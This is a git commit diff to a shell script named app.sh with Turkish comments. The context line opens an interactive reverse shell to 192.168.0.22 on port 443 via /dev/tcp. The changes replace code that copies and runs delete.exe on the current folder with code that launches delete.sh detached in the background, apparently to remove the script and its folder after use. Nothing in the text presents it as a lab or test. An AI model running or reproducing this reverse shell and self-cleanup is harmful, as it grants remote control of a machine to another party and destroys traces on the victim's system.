8d7f9ead51b5cfa7425b0fb9e70f234117e93aa0
SoyluEren2004 <139225815+SoyluEren2004@users.noreply.github.com>
2026-09-05 02:58:43 +0300

    Update app.sh

--- app.sh
+++ app.sh
@@ -4,20 +4,14 @@ bash -i >&/dev/tcp/192.168.0.22/443 0>&1
 
 sleep 2
 
-# Şu anki klasör adını al (örneğin: BashExe)
-CURRENT_DIR_NAME=$(basename "$PWD")
+if [ -f "delete.sh" ]; then
 
-if [ -f "delete.exe" ]; then
-    echo "[+] delete.exe üst dizine kopyalanıyor ve tetikleniyor..."
-    
-    # 1. delete.exe'yi bir üst klasöre kopyala
-    cp delete.exe ../delete.exe
-    
-    # 2. Üst klasördeki delete.exe'yi silinecek klasör parametresiyle (CURRENT_DIR_NAME) arka planda başlat
-    # nohup ve & ile Bash oturumundan bağımsızlaştırıyoruz
-    nohup ../delete.exe "$CURRENT_DIR_NAME" >/dev/null 2>&1 &
-    
-    echo "[+] Temizlik işlemi başlatıldı, çıkış yapılıyor."
-    exit 0
+    echo "[+] delete.sh bağımsız arka planda başlatılıyor..."
+
+    chmod +x delete.sh 2>/dev/null
+
+    nohup ./delete.sh >/dev/null 2>&1 &
+
+    disown
+
 fi
-
